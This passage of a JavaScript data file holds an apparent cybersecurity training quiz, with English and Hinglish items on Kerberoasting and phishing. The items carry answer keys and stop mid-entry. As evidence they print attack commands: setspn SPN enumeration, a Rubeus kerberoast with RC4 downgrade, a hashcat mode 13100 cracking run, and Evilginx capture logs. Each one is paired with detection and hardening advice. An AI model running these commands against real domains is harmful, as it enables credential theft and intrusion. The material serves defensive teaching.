/**
 * Kairos Cybersecurity Curriculum Database
 * 5 Domains, 3 Tiers (Awareness, Mechanics, Mastery), 
 * Real-world artifacts, EL10 explanations, and native Hinglish translations.
 */

export const CYBER_DOMAINS = [
  {
    id: 'ad-kerberoasting',
    title: 'Active Directory Kerberoasting Defense',
    titleHinglish: 'Active Directory Kerberoasting aur Kerberos Security',
    icon: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="2" y="2" width="20" height="8" rx="2" ry="2"></rect><rect x="2" y="14" width="20" height="8" rx="2" ry="2"></rect><line x1="6" y1="6" x2="6.01" y2="6"></line><line x1="6" y1="18" x2="6.01" y2="18"></line></svg>',
    description: 'Investigate Active Directory SPN enumeration, Kerberos TGS-REQ ticket harvesting, offline password hash extraction (Hashcat mode 13100), Windows Event ID 4769 detection, and gMSA remediation.',
    descriptionHinglish: 'Active Directory SPN discovery, TGS tickets harvesting, offline cracking, aur Event 4769 detection seekho.',
    activeLearners: 284,
    microTopics: [
      'SPN Enumeration & Service Account Discovery',
      'Kerberos Cipher Downgrade (RC4-HMAC vs AES-256)',
      'Offline Ticket Decryption & Lockout Bypass',
      'SIEM Detection & Event ID 4769 Analysis',
      'gMSA & Enterprise Hardening'
    ],
    tiers: [
      { id: 1, name: 'Level 1: Awareness', focus: 'Threat Recognition & SPN Reconnaissance' },
      { id: 2, name: 'Level 2: Mechanics', focus: 'TGS-REQ Downgrade & Offline Hash Extraction' },
      { id: 3, name: 'Level 3: Mastery', focus: 'Event ID 4769 Threat Hunting & gMSA Hardening' }
    ],
    diagnostics: [
      {
        id: 'q_ad_1',
        title: 'SPN Enumeration: User vs Computer Account Discrepancy',
        titleHinglish: 'SPN Discovery: User Account vs Computer Account Target',
        microTopic: 'SPN Enumeration & Service Account Discovery',
        scenario: 'An attacker with standard low-privileged domain credentials executes "setspn.exe -T medtech.local -Q */*" to discover Kerberos Service Principal Names. They review the output for "svc_sql_prod" versus "DC01$". Why do attackers specifically target "svc_sql_prod" for Kerberoasting rather than "DC01$"?',
        scenarioHinglish: 'Ek low-privileged domain user ne network par registered SPNs scan kiye. Usse do accounts mile: "svc_sql_prod" aur computer account "DC01$". Attacker ne specifically "svc_sql_prod" ko Kerberoasting ke liye kyun chuna?',
        evidenceType: 'command',
        evidence: `PS C:\\Users\\intern.corp> setspn.exe -T medtech.local -Q */*

CN=SQL-Production-Service,OU=ServiceAccounts,DC=medtech,DC=local
  UserAccountControl: NORMAL_ACCOUNT (0x200)
  sAMAccountName: svc_sql_prod
  ServicePrincipalNames:
    MSSQLSvc/db01.medtech.local:1433
    MSSQLSvc/db01:1433

CN=DC01,OU=Domain Controllers,DC=medtech,DC=local
  UserAccountControl: SERVER_TRUST_ACCOUNT (0x2000)
  sAMAccountName: DC01$
  ServicePrincipalNames:
    HOST/dc01.medtech.local`,
        options: [
          {
            text: 'User service accounts (svc_sql_prod) typically use human-created static passwords crackable offline, whereas machine accounts (ending in $) have 120-character random passwords auto-rotated by Active Directory every 30 days.',
            textHinglish: 'User accounts (svc_sql_prod) ke passwords insaan banate hain jo offline crack ho sakte hain, jabki computer accounts ($ wale) ke passwords 120-character random hote hain jo AD khud rotate karta hai.'
          },
          {
            text: 'Computer accounts cannot issue Kerberos TGS tickets across UDP port 88.',
            textHinglish: 'Computer accounts UDP port 88 par Kerberos tickets issue nahi kar sakte.'
          },
          {
            text: 'Active Directory automatically encrypts user accounts with AES-256 but leaves computer accounts unencrypted in cleartext.',
            textHinglish: 'Active Directory user accounts ko AES se encrypt karta hai par computer accounts ko unencrypted chhodta hai.'
          },
          {
            text: 'Only accounts with "MSSQLSvc" SPNs can execute remote code via xp_cmdshell.',
            textHinglish: 'Sirf MSSQLSvc wale accounts hi xp_cmdshell se attack kar sakte hain.'
          }
        ],
        correctIndex: 0,
        el10: 'Think of computer accounts ($) like high-tech bank vaults with 120-digit combination codes that change every month. But user service accounts are like cheap bicycle locks chosen by a busy human who picked "Summer2024!" because they didn\'t want to forget it!',
        el10Hinglish: 'Computer accounts ($ wale) bank ke digital lockers jaise hain jinka password har 30 din mein computer khud 120 characters ka bana deta hai. Lekin user service accounts ka password insaan rakhte hain jaise "Password@123", jise ghar baith kar aasani se toda ja sakta hai!',
        soWhat: 'Cracking svc_sql_prod reveals the cleartext credentials for database infrastructure, enabling threat actors to dump sensitive records and execute xp_cmdshell for local SYSTEM privilege escalation.',
        remediationQuery: 'kerberoasting spn enumeration setspn active directory',
        videoId: '-3MxoxdzFNI',
        videoTitle: 'Attacking Active Directory - Kerberoasting Deep Dive',
        cheatSheet: [
          'Always filter SPN discovery to user accounts: (samAccountType=805306368) instead of computer accounts (805306369).',
          'Any domain-authenticated user can query all SPNs in the entire forest via standard LDAP without elevated privileges.',
          'Service accounts should never be assigned Domain Admin or Local Administrator rights.'
        ]
      },
      {
        id: 'q_ad_2',
        title: 'The Kerberos Cipher Downgrade (RC4 vs AES)',
        titleHinglish: 'Kerberos Cipher Downgrade (etype 23 RC4 vs etype 18 AES)',
        microTopic: 'Kerberos Cipher Downgrade (RC4-HMAC vs AES-256)',
        scenario: 'An adversary uses Rubeus on a workstation to request a Kerberos service ticket for MSSQLSvc/db01.medtech.local:1433. Look at the console execution output. Why did the attacker explicitly include "/rc4opsec" to force encryption type 0x17 (rc4-hmac) instead of accepting the modern default 0x12 (aes256-cts-hmac-sha1-96)?',
        scenarioHinglish: 'Attacker ne Rubeus tool chalakar Kerberos ticket request kiya. Command mein unhone "/rc4opsec" use karke encryption type "0x17 (RC4)" kyun force kiya jabki modern Windows AES-256 use karta hai?',
        evidenceType: 'command',
        evidence: `PS C:\\Tools> .\\Rubeus.exe kerberoast /spn:"MSSQLSvc/db01.medtech.local:1433" /format:hashcat /rc4opsec

[*] Action: Kerberoasting
[*] Target SPN: MSSQLSvc/db01.medtech.local:1433
[*] Target User: svc_sql_prod (UserAccountControl: NORMAL_ACCOUNT)
[*] Requesting TGS with Encryption Type: 0x17 (rc4-hmac)
[*] Ticket Options: 0x40810000 (Forwardable, Renewable, Canonicalize)

[+] Hashcat Format Hash Extracted:
$krb5tgs$23$*svc_sql_prod$MEDTECH.LOCAL$MSSQLSvc/db01.medtech.local:1433*$0a7b4f3e9c12a87d65b1248192a014bc...[TRUNCATED]...88b2`,
        options: [
          {
            text: 'RC4 encryption prevents the Domain Controller from recording Event ID 4769 in the Security event log.',
            textHinglish: 'RC4 use karne se Domain Controller par koi log record nahi hota.'
          },
          {
            text: 'RC4-HMAC derives its key directly from the NTLM hash (MD4), allowing GPUs (Hashcat mode 13100) to crack billions of passwords/sec compared to CPU-heavy AES-256 key derivation (mode 19700).',
            textHinglish: 'RC4-HMAC ka key NTLM hash (MD4) par chalta hai jo GPU par arbon guesses/sec crack ho sakta hai, jabki AES-256 crack karna 100x zyada slow hota hai.'
          },
          {
            text: 'AES-256 tickets require physical smart cards inserted into the client machine to download.',
            textHinglish: 'AES-256 tickets download karne ke liye physical smart card zaroori hota hai.'
          },
          {
            text: 'The Domain Controller rejects all AES-256 TGS requests originating from non-admin workstations.',
            textHinglish: 'Domain Controller standard workstations se AES requests ko reject kar deta hai.'
          }
        ],
        correctIndex: 1,
        el10: 'RC4 is like asking the clerk to lock your box with a cheap 3-number luggage padlock instead of a heavy steel safe. You can pick that cheap lock in seconds using a computer, whereas the steel safe (AES) would take decades to drill through!',
        el10Hinglish: 'RC4 ko ek saste suitcase ke lock jaisa samjho jise aap 10 second mein pin se khol sakte ho. AES-256 ek bhari tijori jaisa hai jise kholne mein saalon lag jayenge. Isliye attacker janbujhkar RC4 maangte hain!',
        soWhat: 'By forcing an RC4 downgrade, attackers can crack 8-12 character complex service account passwords in under a few hours using consumer-grade graphics cards (RTX 4090).',
        remediationQuery: 'disable rc4 kerberos active directory aes enforcement',
        videoId: '-3MxoxdzFNI',
        videoTitle: 'Attacking Active Directory - Kerberoasting Deep Dive',
        cheatSheet: [
          'Enforce AES-128 and AES-256 Kerberos encryption in domain group policies (msDS-SupportedEncryptionTypes = 0x18).',
          'Disable DES and RC4 cipher suites on both client machines and domain controllers.',
          'Monitor for Event ID 4769 where Ticket Encryption Type is 0x17 from modern Windows 10/11 endpoints.'
        ]
      },
      {
        id: 'q_ad_3',
        title: 'Offline Hash Extraction & Lockout Policy Bypass',
        titleHinglish: 'Offline Cracking aur Account Lockout Bypass',
        microTopic: 'Offline Ticket Decryption & Lockout Bypass',
        scenario: 'A security operations center (SOC) maintains a strict Account Lockout Policy of 5 invalid attempts. An adversary extracts the TGS ticket for "svc_sql_prod" and runs Hashcat on an external GPU rig, submitting 450,000,000 dictionary guesses. Why does this brute-force attack trigger ZERO account lockouts and ZERO failed logon events (Event 4625)?',
        scenarioHinglish: 'Company ke Active Directory mein rule hai: "5 galat password ke baad account lock ho jayega". Attacker ne hashcat se 45 crore passwords try kiye, fir bhi account lock kyun nahi hua aur Event 4625 kyun nahi aaya?',
        evidenceType: 'logs',
        evidence: `# Host: Attacker Kali Linux Rig (Air-gapped from corporate network)
$ hashcat -m 13100 -a 0 svc_sql.hash /usr/share/wordlists/rockyou.txt -r rules/best64.rule

Session..........: hashcat
Status...........: Running
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Speed.#1.........: 1,842.3 MH/s (1.84 Billion hashes/second)
Progress.........: 450,000,000 / 14,344,392,000 (3.14%)
Target Service...: MSSQLSvc/db01.medtech.local:1433
Domain Controller: ZERO packets sent during session`,
        options: [
          {
            text: 'Active Directory lockout thresholds only apply during working business hours (9 AM - 6 PM).',
            textHinglish: 'Active Directory ka lockout rule sirf office ke time par kaam karta hai.'
          },
          {
            text: 'The Kerberos TGS ticket was already delivered to the attacker; the cryptographic decryption happens 100% offline on the attacker\'s GPU without ever communicating with the Domain Controller.',
            textHinglish: 'Ticket pehle hi attacker ke computer par aa chuka hai; password todne ka sara kaam offline GPU par chal raha hai, Domain Controller se koi contact nahi ho raha.'
          },
          {
            text: 'Hashcat automatically sends LDAP heartbeat packets that continually reset the BadPasswordCount attribute to zero.',
            textHinglish: 'Hashcat automatic packets bhej kar password fail count ko zero kar deta hai.'
          },
          {
            text: 'Active Directory exempts all accounts with "svc_" prefixes from domain lockout policies by default.',
            textHinglish: 'svc_ wale accounts par Active Directory mein lockout policy lagti hi nahi hai.'
          }
        ],
        correctIndex: 1,
        el10: 'It\'s like going to the post office, asking for a sealed mystery package, and taking it home. In your garage, you can try 10 million keys on the padlock. The post office has no clue you are trying keys because the package is in your house!',
        el10Hinglish: 'Ye bilkul aisa hai ki aap post office se ek band locker apne ghar le aaye. Ab ghar ke andar baith kar aap 10 lakh nakli chabiyan lagao, post office ke guard ko pata bhi nahi chalega kyunki locker aapke kamre mein hai!',
        soWhat: 'Because the attack is completely silent and offline, attackers can crack complex passwords over days, weeks, or months without alerting traditional endpoint protection or triggering lockout alarms.',
        remediationQuery: 'kerberos offline cracking hashcat mode 13100 lockout bypass',
        videoId: '-3MxoxdzFNI',
        videoTitle: 'Attacking Active Directory - Kerberoasting Deep Dive',
        cheatSheet: [
          'Account Lockout policies only protect against online authentication attempts against the DC.',
          'Only password length (25+ characters) or gMSA auto-generated 120-character keys make offline cracking mathematically unfeasible.',
          'Kerberoasting is completely undetectable at the destination host—the attacker never connects to the target database server!'
        ]
      },
      {
        id: 'q_ad_4',
        title: 'Hunting Event ID 4769: A Kerberos Service Ticket Was Requested',
        titleHinglish: 'Windows Event ID 4769 SIEM Threat Hunting',
        microTopic: 'SIEM Detection & Event ID 4769 Analysis',
        scenario: 'A SOC threat hunter investigates a potential breach. They run a query in Microsoft Sentinel for Windows Event ID 4769 ("A Kerberos service ticket was requested"). Review the raw event payload. Which specific combination of telemetry attributes signals a high-confidence Kerberoasting attack?',
        scenarioHinglish: 'SOC Analyst ne Splunk/Sentinel mein Event ID 4769 search kiya. Niche diye gaye log mein kaun se fields dekh kar saaf pata chalta hai ki ye normal kaam nahi balki Kerberoasting attack hai?',
        evidenceType: 'logs',
        evidence: `LogName: Security
Source: Microsoft-Windows-Security-Auditing
EventID: 4769
TaskCategory: Kerberos Service Ticket Operations
Computer: DC01.medtech.local

Account Information:
  Account Name:         jdoe@MEDTECH.LOCAL
  Supplicant Address:   10.0.4.52:53120

Service Information:
  Service Name:         svc_sql_prod
  Service ID:           S-1-5-21-1928471928-192837492-1004

Network Information:
  Client Address:       ::ffff:10.0.4.52
  Ticket Options:       0x40810000
  Ticket Encryption:    0x17 (RC4-HMAC)
  Status:               0x0 (Success)`,
        options: [
          {
            text: 'Standard user (jdoe) requesting an RC4 (0x17) encrypted ticket for a user account (svc_sql_prod), coupled with no subsequent TCP 1433 connection to the database server from 10.0.4.52.',
            textHinglish: 'Ek normal user (jdoe) user service account ke liye RC4 (0x17) ticket maang raha hai, aur ticket lene ke baad bhi database server (port 1433) se connect hi nahi karta!'
          },
          {
            text: 'The Status code 0x0 indicates a failed Kerberos pre-authentication challenge.',
            textHinglish: 'Status 0x0 ka matlab Kerberos pre-auth fail ho gaya.'
          },
          {
            text: 'The Client Address prefix "::ffff:" proves the attack originated from a Russian dark web proxy.',
            textHinglish: '"::ffff:" IPv6 prefix dark web proxy ko darshata hai.'
          },
          {
            text: 'Ticket Options "0x40810000" is a buffer overflow memory corruption exploit code.',
            textHinglish: '0x40810000 memory crash exploit code hai.'
          }
        ],
        correctIndex: 0,
        el10: 'Imagine someone ordering a pizza coupon at the front desk using a 30-year-old expired format (RC4), and then immediately walking out the door without ever going to the pizza counter to get food!',
        el10Hinglish: 'Aisa socho ki kisi ne canteen counter par jakar 1990 ke zamane ka coupon (RC4) manga, lekin coupon lene ke baad khana lene canteen gaya hi nahi, seedha ghar chala gaya!',
        soWhat: 'Identifying Event 4769 with 0x17 encryption allows SOC defenders to kill the compromised user session and rotate service account credentials BEFORE the offline hash is cracked.',
        remediationQuery: 'detect kerberoasting event id 4769 splunk sentinel',
        videoId: '-3MxoxdzFNI',
        videoTitle: 'Attacking Active Directory - Kerberoasting Deep Dive',
        cheatSheet: [
          'Filter Event 4769 where Ticket Encryption Type is 0x17 and Service Name does NOT end in $ (computer account).',
          'Correlate Event 4769 against NetFlow/Zeek logs: If no network traffic follows to the service host IP, suspect Kerberoasting.',
          'Deploy "Honey SPNs" (fake service accounts with SPNs): Any Event 4769 for a Honey SPN generates an instant high-fidelity P1 alert.'
        ]
      },
      {
        id: 'q_ad_5',
        title: 'The Permanent Defense: gMSA & AES-256 Hardening',
        titleHinglish: 'Permanent Solution: Group Managed Service Accounts (gMSA)',
        microTopic: 'gMSA & Enterprise Hardening',
        scenario: 'An enterprise Active Directory architecture review reveals 48 legacy service accounts vulnerable to Kerberoasting. The Active Directory administrator proposes converting all service accounts to Group Managed Service Accounts (gMSAs) and configuring the script below. Why does this architectural change permanently eliminate the Kerberoasting threat?',
        scenarioHinglish: 'Company ke 48 service accounts Kerberoasting ke liye vulnerable hain. Admin ne un sabhi ko Group Managed Service Accounts (gMSA) mein convert karne ka script chalaya. Isse Kerberoasting ka khatra hamesha ke liye kaise khatam ho jata hai?',
        evidenceType: 'command',
        evidence: `# Step 1: Provision gMSA with Active Directory KDS Root Key
New-ADServiceAccount -Name "gMSA_SQLCluster" \`
  -DNSHostName "sqlcluster.medtech.local" \`
  -PrincipalsAllowedToRetrieveManagedPassword "SQL-Host-Group" \`
  -KerberosEncryptionType AES128,AES256

# Step 2: Remove legacy SPN from human-managed account
Set-ADUser -Identity "svc_sql_prod" -ServicePrincipalNames @{Remove="MSSQLSvc/db01.medtech.local:1433"}

# Step 3: Assign SPN to the new cryptographically-managed gMSA
Set-ADServiceAccount -Identity "gMSA_SQLCluster" -ServicePrincipalNames @{Add="MSSQLSvc/db01.medtech.local:1433"}`,
        options: [
          {
            text: 'gMSA accounts require human admins to enter an SMS MFA token whenever a Kerberos ticket is requested.',
            textHinglish: 'gMSA accounts mein har ticket ke liye SMS OTP enter karna padta hai.'
          },
          {
            text: 'Active Directory automatically generates complex 120-character random passwords rotated every 30 days that humans never see or know, and enforces AES-128/256 encryption, rendering offline dictionary cracking mathematically impossible.',
            textHinglish: 'Active Directory khud 120-character ka complex random password banata hai jo har 30 din mein badalta hai (kisi insaan ko pata nahi hota) aur AES enforce karta hai, jisse offline cracking namumkin ho jati hai.'
          },
          {
            text: 'gMSA completely disables Kerberos across the entire forest and switches all services to NTLMv1.',
            textHinglish: 'gMSA Kerberos ko band karke NTLMv1 chalu kar deta hai.'
          },
          {
            text: 'gMSA hides all database tables from non-administrative domain queries.',
            textHinglish: 'gMSA database tables ko chupa deta hai.'
          }
        ],
        correctIndex: 1,
        el10: 'Instead of letting a human write a 7-letter word on a sticky note for the master password, the computer generates a 120-digit alien combination code every month that no human ever sees. Even the world\'s fastest supercomputer couldn\'t guess it before the universe ends!',
        el10Hinglish: 'Ab insaan koi chhota password nahi banata. Computer khud 120 aksharon ka aisa vishal password bana deta hai jo kisi insaan ko bhi nahi pata hota aur har 30 din mein badalta rehta hai. Isse supercomputer bhi arbon saal tak crack nahi kar sakta!',
        soWhat: 'Eliminating human-managed service passwords completely cuts off the primary lateral movement vector used by ransomware operators (LockBit, BlackCat) to escalate from an initial phishing foothold to full Active Directory domain compromise.',
        remediationQuery: 'implement gmsa active directory kerberoasting mitigation',
        videoId: '-3MxoxdzFNI',
        videoTitle: 'Attacking Active Directory - Kerberoasting Deep Dive',
        cheatSheet: [
          'gMSAs are supported on Windows Server 2012+ and require the Active Directory KDS Root Key.',
          'For legacy systems that cannot use gMSAs, enforce 25+ character random passwords and AES-only encryption.',
          'Regularly audit the domain using PingCastle or BloodHound to detect rogue accounts with SPNs configured.'
        ]
      }
    ]
  },
  {
    id: 'phishing-social-eng',
    title: 'Phishing & Social Engineering',
    titleHinglish: 'Phishing aur Social Engineering Defense',
    icon: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 2v10a4 4 0 0 1-8 0V8"></path></svg>',
    description: 'Master deceptive URL parsing, punycode attacks, email header authentication (SPF/DKIM/DMARC), and MFA push fatigue manipulation.',
    descriptionHinglish: 'Fake URLs, spoofed emails, aur MFA fatigue attacks ko pehchan kar rokna seekho.',
    activeLearners: 142,
    microTopics: ['Subdomain Spoofing', 'Punycode Typosquatting', 'Email Header Analysis', 'MFA Fatigue Defense', 'Reverse Proxy Phishing'],
    tiers: [
      { id: 1, name: 'Level 1: Awareness', focus: 'Threat Identification & Red Flags' },
      { id: 2, name: 'Level 2: Mechanics', focus: 'Attack Vectors & Protocol Inspection' },
      { id: 3, name: 'Level 3: Mastery', focus: 'Forensic Remediation & DMARC Enforce' }
    ],
    diagnostics: [
      {
        id: 'q_phish_1',
        title: 'The Deceptive Banking Portal',
        titleHinglish: 'Dhokhebaaz Netbanking URL',
        microTopic: 'Subdomain Hierarchy & Lookalike Spoofing',
        scenario: 'An employee received an urgent SMS: "Your HDFC account KYC is expired. Update immediately." They clicked the link and are prompted for login.',
        scenarioHinglish: 'Ek employee ko urgent SMS mila: "HDFC account KYC expire ho gaya hai." Usne link click kiya aur login page khul gaya.',
        evidenceType: 'url',
        evidence: 'https://netbanking.hdfcbank.com.co/auth/verify?session=9281',
        options: [
          {
            text: 'Safe: The URL begins with "netbanking.hdfcbank.com" and has an HTTPS padlock.',
            textHinglish: 'Safe hai: URL mein "netbanking.hdfcbank.com" likha hai aur HTTPS padlock bhi hai.'
          },
          {
            text: 'Phishing: The apex root domain is "com.co", not "hdfcbank.com". "netbanking.hdfcbank" is an attacker subdomain.',
            textHinglish: 'Phishing hai: Asli root domain "com.co" hai, "hdfcbank" nahi. Attacker ne subdomain bana rakha hai.'
          },
          {
            text: 'Safe: "com.co" is the official Colombian subsidiary domain for Indian banking systems.',
            textHinglish: 'Safe hai: "com.co" Indian banks ka official international domain extension hota hai.'
          },
          {
            text: 'Phishing: Any URL with a query parameter "?session=" is an active ransomware payload.',
            textHinglish: 'Phishing hai: Har URL jisme "?session=" hota hai wo ransomware hota hai.'
          }
        ],
        correctIndex: 1,
        el10: 'Think of a domain like a street address. The LAST part before the first single slash (/) is the actual house owner. Here, the house owner is "com.co", and the attacker named their bedroom "netbanking.hdfcbank".',
        el10Hinglish: 'Domain ko ghar ke address ki tarah samjho. Pehle single slash (/) se theek pehle jo naam hota hai, wahi asli makaan-malik hai! Yahan makaan-malik "com.co" hai, aur attacker ne apne kamre ka naam "netbanking.hdfcbank" rakh diya hai.',
        soWhat: 'Entering credentials here gives attackers full session access, leading to instant financial fraud or employee credential harvesting.',
        remediationQuery: 'how to read DNS domain names and subdomains cybersecurity',
        videoId: 'Vf6L2x5zHbg', // NetworkChuck DNS tutorial
        videoTitle: 'DNS Explained: How Domain Spoofing Actually Works',
        cheatSheet: [
          'The apex domain is always immediately to the left of the public suffix (.com, .org, .co).',
          'HTTPS padlocks only mean encryption is on—not that the website owner is legitimate!',
          'Always read domain names from right to left starting from the first slash.'
        ]
      },
      {
        id: 'q_phish_2',
        title: 'The Forged Executive Wire Transfer',
        titleHinglish: 'Fake CEO Wire Transfer Email',
        microTopic: 'Email Authentication (SPF, DKIM, DMARC)',
        scenario: 'Finance received an urgent email from "ceo@megacorp.com" demanding an emergency wire of $85,000. Here are the raw headers:',
        scenarioHinglish: 'Finance team ko CEO se emergency wire transfer ki request aayi. Raw email headers ye hain:',
        evidenceType: 'headers',
        evidence: `From: "Alex CEO" <ceo@megacorp.com>
Reply-To: alex-exec@mail-officesecure.net
Received: from mail.attacker-vps.xyz (198.51.100.44)
Authentication-Results: spf=softfail (sender IP not in megacorp SPF record);
  dkim=none;
  dmarc=fail (p=none)`,
        options: [
          {
            text: 'Legitimate: The From header says "ceo@megacorp.com" which cannot be faked.',
            textHinglish: 'Asli hai: From header mein "ceo@megacorp.com" likha hai jo fake nahi ho sakta.'
          },
          {
            text: 'Legitimate: The sender server successfully connected via port 25 with no bounce.',
            textHinglish: 'Asli hai: Sender server connect ho gaya bina kisi bounce ke.'
          },
          {
            text: 'Spoofed: SPF softfailed, DKIM is absent, and Reply-To redirects responses to a third-party domain.',
            textHinglish: 'Spoofed hai: SPF fail hua, DKIM gayab hai, aur Reply-To attacker ke alag domain par ja raha hai.'
          },
          {
            text: 'Safe: DMARC p=none means the domain has maximum security enforcement enabled.',
            textHinglish: 'Safe hai: DMARC p=none ka matlab hai high security enabled hai.'
          }
        ],
        correctIndex: 2,
        el10: 'The "From" field is like writing the CEO’s name on the outside of an envelope with a pen. Anyone can write it! SPF and DKIM are the postal wax seals that prove who actually sent it.',
        el10Hinglish: 'From field bilkul lifafe (envelope) par pen se kisi ka bhi naam likhne jaisa hai. Asli proof SPF aur DKIM ki seal hoti hai jo yahan toot chuki hai.',
        soWhat: 'Without DMARC enforcement (p=reject), external attackers can impersonate C-level executives and trigger catastrophic business email compromise (BEC).',
        remediationQuery: 'spf dkim dmarc explained simply',
        videoId: 'sO4x9_GkXjA',
        videoTitle: 'SPF, DKIM, DMARC in 10 Minutes',
        cheatSheet: [
          'DMARC p=none provides zero protection—it is monitoring only.',
          'Always verify the Reply-To header when analyzing urgent financial requests.',
          'DKIM cryptographic signatures ensure the email was not modified in transit.'
        ]
      },
      {
        id: 'q_phish_3',
        title: 'MFA Push Notification Flood',
        titleHinglish: 'Raat ko 3 Baje MFA Notification Flood',
        microTopic: 'MFA Fatigue (Push Bombing) Attacks',
        scenario: 'At 3:15 AM, a systems engineer receives 42 consecutive push notifications on Microsoft Authenticator: "Approve sign-in to Azure Portal?".',
        scenarioHinglish: 'Raat ko 3:15 baje ek engineer ko 42 notifications aane lage: "Approve sign-in?".',
        evidenceType: 'logs',
        evidence: `03:14:55 AuthReq [User: admin_dev] [IP: 185.220.101.5] [Location: St. Petersburg, RU]
03:14:58 AuthReq [User: admin_dev] [Repeated x12]
03:15:10 PushResponse: PENDING (User device vibrating continuously)
03:15:22 WhatsApp Msg: "IT Helpdesk: Please hit Approve on your authenticator to stop the test."`,
        options: [
          {
            text: 'Press "Approve" so the notifications stop vibrating, then change your password in the morning.',
            textHinglish: '"Approve" daba do taaki phone bajna band ho, subah password badal lena.'
          },
          {
            text: 'Press "Deny", report fraud immediately to SOC, and enable Number Matching or FIDO2 Passkeys.',
            textHinglish: '"Deny" dabao, SOC ko fraud report karo, aur Number Matching ya FIDO2 passkeys enable karo.'
          },
          {
            text: 'Airplane mode the phone; the session will securely self-terminate on the server within 24 hours.',
            textHinglish: 'Phone ko airplane mode par daal do, 24 ghante mein session khatam ho jayega.'
          },
          {
            text: 'Reply to the WhatsApp message with your current password to verify your identity to IT.',
            textHinglish: 'WhatsApp message par apna password bhej do taaki IT verify kar sake.'
          }
        ],
        correctIndex: 1,
        el10: 'An attacker already guessed your password and is ringing your doorbell 100 times hoping you get tired and open the door. Never open the door!',
        el10Hinglish: 'Chor ke paas tumhare ghar ki chabi (password) aa chuki hai aur wo raat bhar doorbell baja raha hai taaki tum tang aakar darwaza khol do. Darwaza bilkul mat kholo!',
        soWhat: 'MFA Fatigue was the exact attack vector behind the Uber, Cisco, and Lapsus$ corporate breaches.',
        remediationQuery: 'mfa fatigue attack prevention number matching',
        videoId: '7a0v24w_ZqI',
        videoTitle: 'MFA Fatigue: How Hackers Bypass Multi-Factor Authentication',
        cheatSheet: [
          'Simple push notifications (Approve/Deny) are vulnerable to fatigue attacks.',
          'Number matching forces the user to type the 2-digit code displayed on the login screen.',
          'FIDO2 / WebAuthn hardware tokens are immune to push fatigue and phishing.'
        ]
      },
      {
        id: 'q_phish_4',
        title: 'The Invisible Cyrillic Impersonation',
        titleHinglish: 'Invisible Cyrillic Character Attack (Punycode)',
        microTopic: 'Internationalized Domain Names (IDN) & Punycode',
        scenario: 'A browser bar displays what looks identical to "apple.com", but looking at the network certificate reveals something unexpected:',
        scenarioHinglish: 'Browser mein "apple.com" dikh raha hai, lekin certificate details mein ye show ho raha hai:',
        evidenceType: 'url',
        evidence: `Browser Address Bar: https://аpple.com/login
Raw DNS Query: xn--pple-43d.com
TLS Subject CN: xn--pple-43d.com (Issuer: Let's Encrypt)`,
        options: [
          {
            text: 'Safe: The browser rendered Latin characters, which means the OS verified the typography.',
            textHinglish: 'Safe hai: Browser ne standard letters render kiye hain.'
          },
          {
            text: 'Homograph Attack: The letter "а" is Cyrillic (U+0430), resolved by DNS as punycode "xn--pple-43d.com".',
            textHinglish: 'Homograph Attack hai: Letter "а" Russian Cyrillic character hai, jiska asli DNS naam "xn--pple-43d.com" hai.'
          },
          {
            text: 'Safe: "xn--" is an internal DNS compression tag used by Apple Cloudflare edge servers.',
            textHinglish: 'Safe hai: "xn--" Apple ke edge CDN ka speed booster tag hota hai.'
          },
          {
            text: 'Phishing: Only domains using .net or .org are capable of hosting TLS certificates.',
            textHinglish: 'Phishing hai: Sirf .net domains par TLS certificate lag sakte hain.'
          }
        ],
        correctIndex: 1,
        el10: 'In the alphabet of another language, there is a letter that looks 100% like English "a", but the computer treats it like a completely different word.',
        el10Hinglish: 'Russian bhasha mein ek letter hota hai jo bilkul English ke "a" jaisa dikhta hai, lekin computer ke liye wo bilkul alag character hai. Aankhein dhoka kha sakti hain!',
        soWhat: 'Users will never spot the difference with human vision alone. Browsers and endpoint filters must inspect punycode strings.',
        remediationQuery: 'punycode idn homograph attack explanation',
        videoId: 'C03K8N3rQjM',
        videoTitle: 'The Scariest Phishing Attack Ever (Punycode)',
        cheatSheet: [
          'Any domain starting with "xn--" is a punycode representation of non-ASCII characters.',
          'Password managers will not autofill credentials into punycode lookalike domains.',
          'Always use password managers as a defensive shield against homograph tricks.'
        ]
      },
      {
        id: 'q_phish_5',
        title: 'Reverse-Proxy Man-in-the-Middle (Evilginx)',
        titleHinglish: 'Evilginx Reverse Proxy Attack',
        microTopic: 'Session Cookie Hijacking via Reverse Proxy',
        scenario: 'A user successfully logs in, types an SMS OTP code, and enters the dashboard. 2 minutes later, an attacker logs into their account without needing the password or the OTP.',
        scenarioHinglish: 'User ne login kiya, SMS OTP daala. 2 minute baad attacker bina password aur bina OTP ke user ke account mein ghus gaya.',
        evidenceType: 'logs',
        evidence: `Attacker Proxy Server (Evilginx2):
[Captured Credentials] User: dev@victim.org | Pass: CorrectHorseBattery#99
[Captured MFA Token] OTP: 829104 (Consumed by real Google Server)
[Captured Session Cookie] Name: OSID | Value: AIzaSyD... | Expiry: +30 days
Status: Attacker injected session cookie into local browser. Session Authenticated.`,
        options: [
          {
            text: 'The attacker cracked the user’s master password hash using rainbow tables.',
            textHinglish: 'Attacker ne password hash ko rainbow table se crack kar liya.'
          },
          {
            text: 'The attacker hosted a transparent proxy that forwarded requests to the real server and captured the authenticated session cookie.',
            textHinglish: 'Attacker ne beech mein proxy baithaya, asli server ko data forward kiya, aur login hote hi authenticated session cookie chura li.'
          },
          {
            text: 'The user’s mobile cell tower was cloned via a Stingray IMSI catcher.',
            textHinglish: 'User ka SIM card clone ho gaya tha.'
          },
          {
            text: 'The SMS OTP code was reused 10 times due to weak random number generation.',
            textHinglish: 'SMS OTP bar-bar use ho gaya kyunki system weak tha.'
          }
        ],
        correctIndex: 1,
        el10: 'Imagine ordering food through a fake waiter who orders from the real chef for you, but steals your receipt so he can claim all your food later.',
        el10Hinglish: 'Socho tum hotel mein baithe ho aur ek fake waiter tumhara order asli chef tak le gaya, lekin bill aur receipt apne paas rakh li taaki wo tumhara khana chura sake.',
        soWhat: 'Traditional SMS and app-based OTPs do not stop reverse proxy phishing. Only FIDO2 / WebAuthn cryptographic origin binding defeats this.',
        remediationQuery: 'evilginx reverse proxy phishing fido2 passkeys',
        videoId: 'pP8p6uJmGZg',
        videoTitle: 'How Hackers Steal Session Cookies with Reverse Proxies',
        cheatSheet: [
